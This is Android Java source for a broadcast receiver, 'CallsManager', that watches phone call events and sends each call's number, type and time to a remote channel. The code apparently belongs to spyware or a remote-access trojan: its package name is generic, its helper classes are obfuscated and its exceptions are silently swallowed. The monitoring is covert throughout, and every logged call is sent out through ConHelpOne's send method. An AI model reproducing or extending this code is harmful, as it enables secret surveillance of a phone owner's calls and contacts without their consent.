package store.apps;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import android.telephony.TelephonyManager;

import java.util.Calendar;
import java.util.Date;

public class CallsManager extends BroadcastReceiver {
    private static String callStartTime;
    @Override
    public void onReceive(Context context, Intent intent) {

        try{

            if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {

                savedNumber = intent.getExtras().getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
            }
            else{
                String stateStr = intent.getExtras().getString(TelephonyManager.EXTRA_STATE);
                String number = intent.getExtras().getString("android.intent.extra.PHONE_NUMBER");
                int state = 0;
                if(stateStr.equals(TelephonyManager.EXTRA_STATE_IDLE)){
                    state = TelephonyManager.CALL_STATE_IDLE;
                }
                else if(stateStr.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)){
                    state = TelephonyManager.CALL_STATE_OFFHOOK;
                }
                else if(stateStr.equals(TelephonyManager.EXTRA_STATE_RINGING)){
                    state = TelephonyManager.CALL_STATE_RINGING;
                }


                onCallStateChanged(context, state, number);
            }
        }catch(Exception e ){}
    }

    private static int lastState = TelephonyManager.CALL_STATE_IDLE;
    // private static Date callStartTime;
    private static boolean isIncoming;
    private static String savedNumber;

    public void onCallStateChanged(Context context, int state, String number) {
        String mydate = java.text.DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime());
        if(lastState == state){
            //No change, debounce extras
            return;
        }
        switch (state) {
            case TelephonyManager.CALL_STATE_RINGING:
                isIncoming = true;

                callStartTime = mydate;
                savedNumber = number;
                onIncomingCallReceived(context, number, callStartTime);
                break;
            case TelephonyManager.CALL_STATE_OFFHOOK:
                //Transition of ringing->offhook are pickups of incoming calls.  Nothing done on them
                if(lastState != TelephonyManager.CALL_STATE_RINGING){
                    isIncoming = false;
                    callStartTime = mydate;
                    onOutgoingCallStarted(context, savedNumber, callStartTime);
                }
                else
                {
                    isIncoming = true;
                    callStartTime = mydate;
                    onIncomingCallAnswered(context, savedNumber, callStartTime);
                }

                break;
            case TelephonyManager.CALL_STATE_IDLE:
                //Went to idle-  this is the end of a call.  What type depends on previous state(s)
                if(lastState == TelephonyManager.CALL_STATE_RINGING){
                    //Ring but no pickup-  a miss
                    onMissedCall(context, savedNumber, callStartTime);
                }
                else if(isIncoming){
                    onIncomingCallEnded(context, savedNumber, callStartTime, new Date());
                }
                else{
                    onOutgoingCallEnded(context, savedNumber, callStartTime, new Date());
                }
                break;
        }
        lastState = state;
    }

    protected void onIncomingCallReceived(Context ctx, String number, String start)
    {
        //
        if(ConHelpOne.echo){

            LOGIT("@onn",number,start.toString());
        }
    }


    protected void onIncomingCallAnswered(Context ctx, String number, String start)
    {
        //
        if(ConHelpOne.echo){

            LOGIT("@ens",number,start.toString());
        }
    }


    protected void onIncomingCallEnded(Context ctx, String number, String start, Date end)
    {
        //
        if(ConHelpOne.echo){
            LOGIT("@ene",number,start.toString());
        }
    }


    protected void onOutgoingCallStarted(Context ctx, String number, String start)
    {
        //
        if(ConHelpOne.echo){
            //  ClassGen2.se(ClassGen3.cl,"ogs".getBytes());
            LOGIT("@ogs",number,start.toString());
        }
    }


    protected void onOutgoingCallEnded(Context ctx, String number, String start, Date end)
    {
        if(ConHelpOne.echo){

            LOGIT("@oge",number,start.toString());
        }
        //
    }


    protected void onMissedCall(Context ctx, String number, String start)
    {
        //
        if(ConHelpOne.echo){

            LOGIT("@mc",number,start.toString());
        }

    }
    public void LOGIT(String status,String N,String S)
    {
        if(ConHelpOne.echo){
            ConHelpOne._send_mthd_(ConHelpOne.cl,(status+"|"+N+"|"+S).getBytes());
        }
    }
}
